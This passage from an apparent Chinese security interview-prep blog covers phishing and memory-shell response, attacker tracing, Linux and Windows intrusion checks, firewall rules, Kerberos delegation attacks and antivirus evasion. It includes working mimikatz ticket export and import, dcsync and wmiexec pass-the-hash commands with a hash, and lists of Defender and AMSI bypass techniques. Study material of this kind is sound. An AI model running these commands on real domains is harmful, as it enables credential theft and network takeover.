对访问钓鱼网站的内网 IP 进行记录，以便后续排查溯源可能的后果</li></ol><p>处理接收到钓鱼邮件的用户：<br>(1) 根据钓鱼邮件发件人进行日志回溯<br>(2) 此处除了需要排查有多少人接收到钓鱼邮件之外，还需要排查是否公司通讯录泄露。采用 TOP500 姓氏撞<br>库发送钓鱼邮件的攻击方式相对后续防护较为简单。如果发现是使用公司通讯录顺序则需要根据通讯录的离职<br>情况及新加入员工排查通讯录泄露时间。毕竟有针对性的社工库攻击威力要比 TOP100、TOP500 大很多<br>(3) 通知已接收钓鱼邮件的用户进行处理<br>(4) 删除钓鱼邮件<br>(5) 全盘扫毒<br>(6) 系统改密</p><p>后续：溯源、员工培训提升安全意识</p><ol start="78"><li><p>内存马排查</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">先判断是通过什么方法注入的内存马，可以先查看web日志是否有可疑的web访问日志</span><br><span class="line">如果是filter或者listener类型就会有大量url请求路径相同参数不同的，或者页面不存在但是返回200的</span><br><span class="line">**，</span><br><span class="line">查看是否有类似哥斯拉、冰蝎相同的url请求，哥斯拉和冰蝎的内存马注入流量特征与普通webshell的流量特</span><br><span class="line">征基本吻合</span><br><span class="line">通过查找**返回200的url路径对比web目录下是否真实存在文件，如不存在大概率为内存马**</span><br><span class="line">如在web日志中并未发现异常，可以排查是否为中间件漏洞导致代码执行注入内存马，</span><br><span class="line">排查中间件的error.log日志查看是否有可疑的报错，根据注入时间和方法根据业务使用的组件排查是否可能存在java代码执行漏洞以及是否存在过webshell，排查框架漏洞，反序列化漏洞。</span><br></pre></td></tr></table></figure></li><li><p>@ 什么是SSO？<br>单点登录（SSO）是一种身份验证解决方案，可让用户通过一次性用户身份验证登录多个应用程序和网站。鉴于当今的用户经常直接从其浏览器访问应用程序，因此组织正在优先考虑改善安全性和用户体验的访问管理策略。SSO 兼具这两方面的优点，因为一旦验证身份，用户就可以访问所有受密码保护的资源，而无需重复登录。</p></li></ol><p>原理：<br>SSO 在应用程序或服务与外部服务提供商（也称为身份提供者（IdP））之间建立信任。这是通过在应用程序和集中式 SSO 服务之间执行的一系列身份验证、验证和通信步骤来实现的。</p><p>SSO 流程如下：</p><p>1、当用户登录应用程序时，应用程序会生成 SSO 令牌并向 SSO 服务发送身份验证请求。<br>2、该服务会检查用户之前是否在系统中进行了身份验证。如果是，它会向应用程序发送一个身份验证确认响应，以授予用户访问权限。<br>3、如果用户没有经过验证的凭证，SSO 服务会将用户重定向到中央登录系统并提示用户提交其用户名和密码。<br>4、提交后，服务会验证用户凭证并将肯定响应发送到应用程序。<br>5、否则，用户会收到错误消息并且必须重新输入凭证。多次尝试登录失败可能会导致服务阻止用户在固定的时间段内进行更多尝试。 </p><ol start="80"><li>@ 什么是内网穿透？<br>内网穿透，简单地说就是内网的数据让外网可以获取，可以映射到公共网络上，这样就可以在公共网络上访问内网的数据。<br>工具：<br>ssh：<br>frp：frp 是一个高性能的反向代理应用，可以帮助您轻松地进行内网穿透，对外网提供服务，支持 tcp, http, https 等协议类型，并且 web 服务支持根据域名进行路由转发。<br>花生壳：<br>EarthWorm：EW 是一套便携式的网络穿透工具，具有 SOCKS v5 服务架设和端口转发两大核心功能，可在复杂网络环境下完成网络穿透。<br>reGeorg：reGeorg 是 reDuh 的继承者, 利用了会话层的 socks5 协议, 结合 Proxifier 使用效率会更高。</li></ol><p><a href="file:///D:/Telegram_Download/%E9%9D%A2%E8%AF%95%E9%A2%98(1).pdf">面试题1</a></p><ol start="81"><li>溯源总结<br>1、IP<br>首先丢微步情报社区，看其是否归属IDC机房或者云主机，如果是，就考虑查域名历史解析记录（微步有），如果不是，就继续判断，其是否为肉鸡或者代理IP，如果是肉鸡的话，微步情报社区会有历史攻击记录，或者被打上傀儡机标签，如果是代理IP的话，扫描它的端口，一般代理服务都会有端口指纹，例如ccproxy，如果上面都没有，就有可能是真实的国内ip，可以尝试用高精度定位网站进行定位</li></ol><p>2、域名<br>反查注册人，如果开启了隐私保护政策，就通过微步情报社区，查看历史解析IP，用同样的套路，记录反查域名和注册人信息</p><p>3、社交账号<br>一般是通过蜜罐的JSONP跨域来获得</p><p>4、恶意样本<br>上传微步云沙箱获得C2地址，利用微软的strings.exe工具解析铭感字符串，此外还要关注调试信息、有无pdb文件，可能会泄露物理路径，其中的计算机名可能是黑客ID</p><p>5、ID<br>搜索引擎（百度，谷歌），社交网站（微博，贴吧），技术博客（csdn，博客园），src平台（补天），社工库（telegram社工机器人），论坛（吾爱破解），尝试加微信（ID可能就是微信ID）</p><p><a href="https://www.freebuf.com/articles/web/263539.html">面试题总结其一</a></p><ol start="82"><li>@ Linux入侵检测&#x2F;Linux入侵排查&#x2F;Linux应急响应<br>1、Linux日志<br>bash历史记录：history命令<br>日志记录：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/var/log/auth.log  认证</span><br><span class="line">/var/log/cron.log  Cron任务</span><br><span class="line">/var/log/maillog   邮件</span><br><span class="line">/var/log/httpd    Apache</span><br></pre></td></tr></table></figure></li></ol><p>2、检查ssh登录<br>查看有没有保存可疑的公钥文件</p><p>3、检查文件状态改动时间<br>在Linux下，文件有三种时间：访问时间(access time)、修改时间(modify time)、状态改动时间(change time)。<br>某文件从其他服务器传到本服务器路径下，或者从某个压缩包中解压，change time 会变成当前时间，而 access time 和 modify time 不会变化。再结合进程的启动时间，基本就能确定此文件首次在本服务器的生成时间。</p><p>4、检查用户<br>Linux不同的用户，有不同的操作权限，但是所有用户都会在 <code>/etc/passwd, /etc/shadow, /etc/group</code> 文件中记录。</p><p><code>less /etc/passwd</code>　　查看是否有新增用户</p><p><code>grep :0 /etc/passwd</code>　　查看是否有特权用户（root权限用户）</p><p><code>ls -l /etc/passwd</code>　　查看passwd最后修改时间</p><p><code>awk -F: &#39;$3==0 &#123;print $1&#125;&#39; /etc/passwd</code>　　查看是否存在特权用户</p><p><code>awk -F: &#39;length($2)==0 &#123;print $1&#125;&#39; /etc/shadow</code>　　查看是否存在空口令用户</p><p>注：linux设置空口令: <code>passwd -d username</code></p><p>5、检查进程<br>一般被入侵的服务器都会运行一些恶意程序，或是挖矿程序，或者DDOS程序等等，如果程序运行着，那么通过查看进程可以发现一些信息。 如一般的反弹shell，核心是将bash的标准输入和标准输出都绑定到了socket fd 上，故 <code>lsof -p pid</code> 如果看到某bash 进程的0 1 绑定在<code>tcp:socket</code> 上，就是有问题的。简单通过 <code>bash -i</code> 来判断是否反弹shell，可能导致误报，如 <code>/usr/bin/script</code> 脚本的作用是用于存储每个SESSION的工作，只有在远程连接中的情况下才会被执行，默认执行就会启动 <code>bash -i</code> 。</p><p>6、检查系统文件完整性<br>被入侵的网站，通常肯定有文件被改动，那么可以通过比较文件创建时间、完整性、文件路径等方式查看文件是否被改动。</p><p>7、检查网络<br>检查网络的目的，是查看黑客是否通过篡改网卡类型，进行流量嗅探等操作。</p><p>8、检查计划任务<br>当我们尝试kill恶意程序时，往往会遇到被kill程序自动启动的问题，那么就要检查下计划任务(cron)了。</p><p>9、检查系统中的core文件<br>通过发送畸形请求来攻击服务器的某一服务来入侵系统是一种常规的入侵方法，典型的RPC攻击就是通过这种方式。这种方式有一定的成功率，也就是说它并不能100%保证成功入侵系统，而且通常会在服务器相应目录下产生core文件，全局查找系统中的core文件，输入find &#x2F; -name core –exec ls –l {} ; 依据core所在的目录、查询core文件来判断是否有入侵行为。</p><p>10、检查系统后门<br>可以使用工具，如：clamAV（病毒库比较难下）、lynis（基础安全检查非常不错）、Conmodo、rkhunter、chkrootkit 等，<br>当然也可以手工输入命令检查。</p><p>11、检查内核级后门<br>首先，检查系统加载的模块，在LINUX系统下使用lsmod命令，在solaris系统下使用modinfo命令来查看。</p><p>12、webshell查找<br>Webshell的排查可以通过文件、流量、日志三种方式进行分析，基于文件的命名特征和内容特征，相对操作性较高，在入侵后应急过程中频率也比较高。</p><p>13、查看应用类<br>Apache、tomcat、Nginx、IIS<br>web服务器其实日志需要关注的东西是一致的，即access_log和error_log。</p><ol start="83"><li>某些命令被替换了，如何发现  &#x2F;  rpm有个参数就可以校验命令是否被替换，是什么<br>1、AIDE入侵检测工具<br>AIDE 是一款入侵检测工具，主要用途是检查文档的完整性。通过构建一个基准的数据库，保存文档的各种属性，一旦系统被入侵，可以通过对比基准数据库而获取文件变更记录。</li></ol><p>2、RPM检查<br>通过 <code>rpm -Va</code> 来检查已安装的rpm包的完整性，防止rpm也被替换，可上传一个安全干净稳定版本的rpm二进制文件到服务器上进行检查。</p><p>3、检查md5sum和文件大小，判断是否被替换<br><code>md5sum /bin/netstat</code></p><ol start="84"><li>@ Windows应急响应&#x2F;Windows入侵排查&#x2F;Windows入侵检测<br>1、账号排查<br>在红队视角下，Windows账户有三种：<br>正常用户: <code>net user</code> 能看到<br>隐藏用户: <code>net user</code> 看不到，但在控制面版，用户组，使用命令wmic可以看到。<br>影子用户: 只有在注册表中能看到，方法是Win+R，输入 <code>regedit</code> 。查找 <code>HKEY_LOCAL_MACHINE/SAM/SAM/Domains/Account/Users/Names/</code></li></ol><p>2、网络排查<br>查找可疑端口和进程：<br>非管理员输入: <code>netstat -ano</code><br>管理员输入: <code>netstat -anob</code><br>任务管理器通过pid查找可疑进程详细信息<br>进程排查可用火绒剑代替任务管理器</p><p>3、注册表排查<br>用户自启动项<br>镜像劫持</p><p>4、系统相关信息排查<br>查看计划任务: <code>taskschd.msc</code><br>查看服务: <code>services.msc</code><br>查找最近打开的文件</p><ol start="85"><li>对抗杀软之白加黑 杀毒软件<br>白加黑可达到如下效果：<br>1、执行敏感命令<br>2、提升权限<br>3、权限维持</li></ol><p>白加黑的加载方式：<br>1、白执行黑dll<br>2、白执行dll加载shellcode<br>3、白加载shellcode</p><p>白加黑的通用流程&#x2F;思路：<br>1、寻找合适的白文件：手工查找<br>2、查看是否有写入权限，如果有可以考虑直接修改，反之考虑通过LoadLibrary函数创建一个新的黑DLL</p><p>检测和预防：<br>1、检查具有异常网络连接的进程，且给定进程的网络活动已变得与基线不同，则该进程可能已受到损害<br>2、DLL权限，针对具有LoadLibrary()函数的DLL进行限制<br>3、DLL白名单，即跟踪系统上使用的DLL的哈希值以识别差异</p><p><a href="https://xz.aliyun.com/t/12376">白加黑的初步探究</a></p><ol start="86"><li>@ 约束委派，非约束委派攻击原理<br><strong>域委派</strong>：<br>是将域用户的权限委派给服务账号，委派之后，服务账号就可以以域用户的身份去做域用户能够做的事</li></ol><p>注意：能够被委派的用户只能是服务账号或者机器账号<br>1、机器账户:活动目录中的computers组内的计算机，也被称为机器账号。<br>2、服务账号：域内用户的一种类型，是服务器运行服务时所用的账号，将服务运行起来加入域内，比如：SQLServer，MYSQL等，还有就是域用户通过注册SPN也能成为服务账号。<br>服务账号（Service Account），域内用户的一种类型，服务器运行服务时所用的账号，将服务运行起来并加入域。就比如 SQL Server在安装时，会在域内自动注册服务账号SqlServiceAccount，这类账号不能用于交互式登录。</p><p><strong>非约束委派</strong>：<br>在域中如果出现A使用Kerberos身份验证访问域中的服务B,而B再利用A的身份去请求域中的服务C，这个过程就可以理解为委派</p><p>利用方式1：<br>使域管理员访问被控机器，找到配置了非约束委派的机器（机器账户） 并且获取其管理员权限<br>具体示例：用administrator登录，将mimikatz上传，查看本地票据( <code>mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::tickets /export&quot; exit</code> )，使用域控访问web，在域控上执行命令: <code>net use \\web.haishi.com</code> ，返回web重新导出票据。<br>导入票据: <code>mimikatz.exe &quot;kerberos::ptt [0;36eb98]-2-0-60a10000-Administrator@krbtgt-HAISHI.COM.kirbi&quot; &quot;exit&quot;</code><br>可成功访问。</p><p>利用方式2：<br>利用打印机漏洞，强迫运行打印服务(Print Spooler)的主机向目标主机发起Kerberos或NTLM认证请求。<br>条件：administrator权限，域用户的账户密码，域控开启打印机<br>使用工具 <a href="https://github.com/leechristensen/SpoolSample/">SpoolSample</a> 编译<br>使用mimikatz，需要使用域用户运行SpoolSample<br>使用命令打开一个域用户权限的powershell: <code>runas /user:haishi.com\many powershell</code><br>然后在该用户的powershell运行: <code>C:/Users/Administrator/Desktop/SpoolSample.exe dc web</code> ，然后导出票据<br>之后再导入票据: <code>mimikatz.exe &quot;kerberos::ptt [0;af1f8]-0-0-60a50000-DC$@cifs-dc.haishi.com.kirbi&quot; &quot;exit&quot;</code><br>导出hash: <code>lsadump::dcsync /domain:haishi.com /user:haishi\Administrator</code><br>利用wmiexec.py远程登陆: <code>python3 wmiexec.py -hashes :fb4f3a0d0b8c4d81d72d36b925dbed6c haishi.com/administrator@10.150.127.166 -no-pass</code><br>这里用的工具包impacket(github自行下载)<br>然后清除票据<br>但其实在实战中 很少遇到这种情况</p><p><strong>约束性委派</strong>：<br>由于非约束委派的不安全性，微软在windows2003中发布了约束委派的功能，如下所示</p><p>在约束委派中的kerberos中，用户同样还是会将TGT发送给相关受委派的服务，但是由于S4U2proxy的影响，对发送给受委派的服务去访问其他服务做了限制，不允许受委派的服务代表用户使用这个TGT去访问任意服务，而是只能访问指定的服务。</p><p>引入了两个新的概念</p><p>S4U2self<br>允许受约束委派的服务代表任意用户向KDC请求服务自身，从而获得一张该用户（任意用户）的对当前受约束委派服务的票据TGS(ST)，该服务票据TGS(ST)包含了用户的相关信息，比如该用户的组信息等。</p><p>S4U2proxy<br>允许受约束委派的服务通过服务票据ST，然后代表用户去请求指定的服务。</p><p>利用方式：<br>1、使用机器账户Web<br>2、使用机器账户hash<br>3、用机器账户的hash 远程wmiexec登录<br>4、使用服务账户</p><p>但在实战中 约束性委派也遇到的很少</p><p><strong>基于资源的约束性委派</strong>：<br>为了使用户&#x2F;资源更加独立，Windows Server 2012中引入了基于资源的约束委派。基于资源的约束委派允许资源配置受信任的帐户委派给他们。基于资源的约束委派将委派的控制权交给拥有被访问资源的管理员。</p><p>上面“基于资源的约束委派将委派的控制权交给拥有被访问资源的管理员”，这就导致了正常只要是域用户都有权限进行委派操作。</p><p>与约束委派最大的不同点，就是”基于资源”这四个字，如何理解”基于资源”？在设置相关的约束委派的实现的时候不再需要域管理员自己去设置相关约束委派的属性，而操作权落在了当前登录的机器或者用户的手中</p><p>基于资源的约束性委派的优势：<br>委派的权限授予给了拥有资源的后端，而不再是前端<br>约束性委派不能跨域进行委派，基于资源的约束性委派可以跨域和林<br>不再需要域管理员权限设置委派，只需拥有在计算机对象上编辑msDS-AllowedToActOnBehaffOtherldentity属性权限也就是将计算机加入域的域用户和机器自身拥有权限。</p><p>约束性委派和基于资源的约束性委派配置的差别：<br>传统的约束委派是正向的，通过修改服务A的属性msDS-AlowedToDelegateTo，添加服务B的SPN，设置约束委派对象（服务B)，服务A便可以模拟用户向域控制器请求访问服务B的ST服务票据。<br>而基于资源的约束委派则是相反的，通过修改服务B属性msDS-AllowedToActOnBehalfOfotherldentity，添加服务A的SID，达到让服务A模拟用户访问B资源的目的。</p><p>msDS-AllowedToActOnBehalfOfOtherIdentity属性指向委派账户（也就是我们创建的机器账户或已知机器账户）</p><p>条件：<br>具有对主机修改msDS-AllowedToActOnBehalfOfOtherIdentity属性的权限(如已经控制的主机是WEB 则具有修改WEB主机的msDS-AllowedToActOnBehalfOfOtherIdentity的权限账户)<br>可以创建机器账户的域用户（或已知机器账户）</p><p>利用方式：<br>1、基于资源的约束委派攻击本地提权<br>2、Account Operators组用户拿下主机<br>3、结合HTLM Relay接管域控（CVE-2019-1040）<br>4、打造变种黄金票据<br>在获得域控的权限后 对krbtgt用户设置委派属性 来打造黄金票据 进行权限维持</p><p>域委派防范措施：<br>1、高权限用户，设置为敏感用户，不能被委派<br>2、主机账号需设置委派时，只能设置为约束性委派<br>Windows 2012 R2及更高的系统建立了受保护的用户组Protected Users，组内用户不允许被委派，这是有效的手段。受保护的用户组，但有一个cve可绕过这些限制CVE-2020-1704<br>稳的防范 就打补丁 KB4598347</p><p><a href="https://xz.aliyun.com/t/11555">域渗透之委派攻击全集</a></p><ol start="87"><li>windows defender防御机制原理，如何绕过？Windows防火墙防御原理.杀软<br>防御机制原理：<br>Windows Defender使用病毒定义和启发式来捕捉危险程序。<br>绕过：1、使用自定义加密绕过静态分析 2、部分函数不会触发动态扫描（运行时分析）</li></ol><p>绕过Windows defender的方式：<br>1、内存中 AMSI&#x2F;ETW 补丁<br>我要说明的第一种方法也是我个人使用最多的一种方法，非常方便快捷。<br>AMSI，或 AntiMalware Scan Interface，是一种与供应商无关的 Windows 安全控件，它扫描 PowerShell、wscript、cscript、Office 宏等，并将遥测数据发送给安全提供商（在我们的案例中为 Defender）以确定它是否是恶意的.<br>ETW，或 Windows事件跟踪，是另一种安全机制，用于记录在用户模式和内核驱动程序上发生的事件。供应商然后可以分析来自流程的此信息，以确定它是否具有恶意意图。</p><p>2、代码混淆<br>对于 C&#x2F;C++ 等本机编译语言，通常不需要或不值得花时间进行代码混淆，因为编译器无论如何都会应用大量优化。但是很大一部分恶意软件和工具是用 C# 编写的，有时是用 Java 编写的。这些语言被编译为字节码&#x2F;MSIL&#x2F;CIL，可以很容易地进行逆向工程。这意味着您将需要应用一些代码混淆以避免签名检测。</p><p>3、编译时混淆<br>对于 C、C++、Rust 等本机编译语言，您可以利用编译时混淆来隐藏子例程和一般指令流的真实行为。<br>根据语言的不同，可能存在不同的方法。由于我的恶意软件开发首选 C++，因此我将解释我尝试过的两个：LLVM 混淆和模板元编程。<br>该工具生成的二进制文件通常更难被人类&#x2F;AV&#x2F;EDR 静态分析。</p><p>4、二进制混淆&#x2F;打包<br>一旦你已经生成了二进制文件，你的选项主要有以下几种：</p><p>混淆二进制文件的汇编指令。<br>打包二进制文件。<br>加密二进制文件的内容以在运行时对其进行解密。<br>或者，将其转换为 shellcode 以供以后操作和注入。</p><p>5、加密Shellcode注入<br>Shellcode 注入是一种非常著名的技术，它包括在给定的牺牲过程中插入&#x2F;注入与位置无关的 Shellcode，以最终在内存中执行它。这可以通过多种方式实现。</p><p>6、甜甜圈shellcode加载<br>TheWover 的 Donut 项目是一个非常有效的 Position-Independent shellcode 生成器，来自 PE&#x2F;DLL。根据给定的输入文件，它以不同的方式工作。</p><p>7、定制工具<br>Mimikatz、Rubeus、Certify、PowerView、BloodHound 等工具之所以受欢迎是有原因的：它们在单个包中实现了很多功能。这对恶意行为者非常有用，因为他们可以仅使用一些工具自动传播恶意软件。然而，这也意味着供应商很容易通过注册其签名字节（例如，菜单字符串、C# 中的类&#x2F;命名空间名称等）来关闭整个工具。</p><p>8、有效载荷分级<br>将有效载荷分成渐进阶段无论如何都不是新技术，威胁参与者通常使用它来传播逃避初始静态分析的恶意软件。这是因为真正的恶意负载将在稍后阶段被检索和执行，静态分析可能没有机会发挥作用。</p><p>9、反射加载<br>您可能还记得第一部分中我们在修补内存中的 AMSI 后执行 Mimikatz 作为 Defender 停止扫描进程内存的演示。这是因为 .NET 公开了 System.Reflection.Assembly API，我们可以使用它来反射加载和执行.NET程序集（定义为“表示一个程序集，它是一个可重用、可版本化且自描述的公共构建块语言运行时应用程序。”）在内存中。</p><p>10、P&#x2F;调用 C# 程序集<br>P&#x2F;Invoke 或 Platform Invoke 允许我们从非托管本机 Windows DLL 访问结构、回调和函数，以便访问可能无法直接从 .NET 获得的本机组件中的较低级别 API。</p><p>现在，由于我们知道它的作用，并且知道我们可以在 PowerShell 中使用 .NET，这意味着我们可以从 PowerShell 脚本访问低级 API，如果我们之前修补 AMSI，我们可以在没有 Defender 监视的情况下运行该脚本。</p><p><a href="https://www.ddosi.org/bypassing-windows-defender/">绕过Windows Defender的10种方法|Bypass</a></p><ol start="88"><li><p>卡巴斯基进程保护如何绕过进行进程迁移？<br>通过蓝屏获得memory.dmp绕过卡巴斯基，通过蓝屏绕过卡巴斯基的内存保护抓取密码，使用RPC控制isass加载SSP</p></li><li><p>内存马的机制<br>1、servlet-api型<br>通过命令执行等方式动态注册一个新的listener、filter或servlet，从而实现命令执行等功能。特定框架、容器的内存马原理与此类似，如spring的controller内存马，tomcat的value内存马<br>2、字节码增强型<br>通过Java的instrumentation动态修改已有代码，进而实现命令执行等功能。</p></li><li><p>WAF和IPS的区别<br>IPS位于防火墙和网络的设备之间，防火墙可以拦截底层攻击行为，但无法有效面对应用层的深层攻击。IPS是对防火墙的补充，综合能力更强；WAF是工作在应用层的防火墙，主要对Web请求&#x2F;响应进行防护。</p></li><li><p>木马驻留系统的方式有哪些？<br>1、注册表<br>2、服务<br>3、启动目录<br>4、计划任务<br>5、关联文件类型</p></li><li><p>应急响应常见流程：<br>1、响应。事件类型判断，保持第一现场，信息收集。<br>2、阻断。切断网络，阻断传播，隔离核心资产，隔离受害群体<br>3、分析。日志分析，流量分析，恶意样本分析，行为分析（进程&#x2F;启动项），还原攻击过程<br>4、清除。杀进程，删文件，恢复受害群体<br>5、加固。打补丁，补足策略，升级设备，完善防御流程</p></li></ol><p>常见网络安全应急响应场景：<br>勒索病毒，挖矿木马，webshell，网页篡改，DDoS攻击，数据泄露，流量劫持</p><p><a href="https://www.freebuf.com/articles/system/358912.html">应急响应-从理论到实战</a></p><ol start="93"><li><p>电子取证<br><a href="https://mp.weixin.qq.com/s?__biz=MzIyNzU0NjIyMg==&mid=2247485449&idx=1&sn=0f115c9ea54538cd85815fae9230facc&chksm=e85ecd08df29441e23ba641fe94cbd356979b7f045d3b6f8623b06b86aeca6bbe6ca1597c202&scene=21#wechat_redirect">数据安全与取证</a></p></li><li><p>Linux防火墙<br>Linux防火墙的作用如下：<br>1、过滤和控制流量：防火墙检查进出的数据包，并根据规则决定是否允许或阻止其传输。它可以根据源ip地址、目的ip地址和端口号等条件对数据包进行过滤，以控制网络流量。<br>2、防止未经授权的访问：防火墙可以配置以阻止未经授权的外部主机访问受保护的内部网络。它可以通过限制入站连接、禁止特定ip地址或网络的访问等方式来保护网络免受入侵。<br>3、检测和阻止恶意活动：防火墙可以监视网络流量并检测可能的恶意活动，例如端口扫描、拒绝服务攻击等。它可以配置以阻止这些恶意活动，保护网络免受攻击。</p></li></ol><p>在Linux系统中，常用的防火墙工具是iptables和nftables。这些工具允许管理员定义规则集，配置网络流量的过滤和转发。以下是一个使用iptables配置防火墙规则的示例：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">清空现有规则</span></span><br><span class="line">iptables -F</span><br><span class="line">iptables -X</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置默认策略</span></span><br><span class="line">iptables -P INPUT DROP</span><br><span class="line">iptables -P FORWARD DROP</span><br><span class="line">iptables -P OUTPUT ACCEPT</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">允许回环接口的流量</span></span><br><span class="line">iptables -A INPUT -i lo -j ACCEPT</span><br><span class="line">iptables -A OUTPUT -o lo -j ACCEPT</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">允许已建立的和相关的连接</span></span><br><span class="line">iptables -A INPUT -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">允许SSH连接</span></span><br><span class="line">iptables -A INPUT -p tcp --dport 22 -j ACCEPT</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">允许HTTP和HTTPS连接</span></span><br><span class="line">iptables -A INPUT -p tcp --dport 80 -j ACCEPT</span><br><span class="line">iptables -A INPUT -p tcp --dport 443 -j ACCEPT</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">拒绝其它所有流量</span></span><br><span class="line">iptables -A INPUT -j REJECT</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">保存规则</span></span><br><span class="line">iptables-save &gt; /etc/iptables/rules.v4</span><br></pre></td></tr></table></figure><p>Linux防火墙常用的工具和服务：<br>1、iptables: 这是Linux中最常用的防火墙工具。是一个命令行工具，用于配置和管理防火墙规则。iptables允许管理员定义规则集，以过滤和控制网络流量的传输。<br>2、UFW(Uncomplicated Firewall): UFW是iptables的前端工具，它提供了一个简化的界面来配置和管理防火墙规则。UFW使得配置防火墙变得更容易，特别适合初学者使用。<br>3、firewalld: firewalld是red hat系列发行版中使用的防火墙管理工具。它提供了一个动态管理防火墙规则的接口，支持网络区域和服务的定义，使得配置和管理防火墙更加灵活方便。<br>4、Shorewall: Shorewall是一个基于iptables的高级防火墙工具。它提供了一个配置文件的抽象层，使得配置复杂的防火墙规则变得更加简单和易于维护。<br>5、Fail2Ban: Fail2Ban是一个用于防止恶意登录和拒绝服务攻击的工具。它监视系统日志文件，并根据预定义的规则自动封锁来自恶意ip地址的连接。</p><p>Linux防火墙开放&#x2F;关闭端口:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用iptables命令</span></span><br><span class="line">sudo iptables -A INPUT -p tcp --dport 端口号 -j ACCEPT   # 开放端口</span><br><span class="line">sudo iptables -A INPUT -p tcp --dport 端口号 -j DROP     # 关闭端口</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用firewalld命令</span></span><br><span class="line">sudo firewall-cmd --permanent --add-port=端口号/tcp      # 开放端口</span><br><span class="line">sudo firewall-cmd --reload</span><br><span class="line"></span><br><span class="line">sudo firewall-cmd --permanent --remove-port=端口号/tcp   # 关闭端口</span><br><span class="line">sudo firewall-cmd --reload</span><br></pre></td></tr></table></figure><p>配置Linux防火墙规则以允许特定IP地址或IP范围访问</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">sudo iptables -L  # 查看当前的防火墙规则</span><br><span class="line">sudo iptables -A INPUT -s 允许访问的ip地址/范围 -j ACCEPT  # 允许特定ip地址或范围访问</span><br><span class="line">sudo iptables -A INPUT -s 阻止访问的ip地址/范围 -j DROP    # 阻止特定ip地址或范围访问</span><br><span class="line">sudo iptables -A INPUT -j ACCEPT  # 允许其它所有流量通过</span><br><span class="line">sudo sysctl -w net.ipv4.ip_forward=1  # 启用ip转发</span><br><span class="line">sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 目标ip:8080  # 使用iptables工具配置端口转发规则</span><br><span class="line">sudo iptables -A FORWARD -p tcp --dport 8080 -d 目标ip地址 -j ACCEPT  # 允许转发的流量通过</span><br><span class="line">sudo iptables -L -v  # 查看详细信息</span><br><span class="line">sudo iptables -t 表名 -L   # 查看特定表(如nat表或mangle表)规则</span><br><span class="line">sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT   # 允许SSH连接</span><br><span class="line">sudo systemctl enable iptables-restore  # 启用iptables-restore服务</span><br><span class="line">sudo systemctl start iptables-restore   # 启动iptables-restore服务</span><br><span class="line"></span><br><span class="line">sudo iptables -A INPUT -p tcp --dport 80 -j LOG --log-prefix &quot;HTTP IN: &quot;</span><br><span class="line">sudo iptables -A OUTPUT -p tcp --dport 80 -j LOG --log-prefix &quot;HTTP OUT: &quot;    # 允许所有传入和传出的HTTP流量，并将相关日志记录到/var/log/iptables.log文件中</span><br><span class="line">sudo tail -f /var/log/iptables.log   # 查看防火墙日志</span><br></pre></td></tr></table></figure><ol start="95"><li>防火墙技术学习<br>一般企业架设的网络结构如下所示：<br><img src="/simg/firewall1.png" alt="firewall"><br>内部网络：企业内部的局域网，禁止外部网络访问，同时对外部网络的访问权有限<br>DMZ: 对外部提供服务的服务器，例如web服务器等放在该网段它单独于内部网络，为内外网之间的通信起缓冲作用。</li></ol><p><strong>防火墙分类</strong>：<br>按在网络协议栈中的过滤层次可分为：包过滤防火墙，电路级防火墙，应用级防火墙（代理防火墙）<br><img src="/simg/firewall2.png" 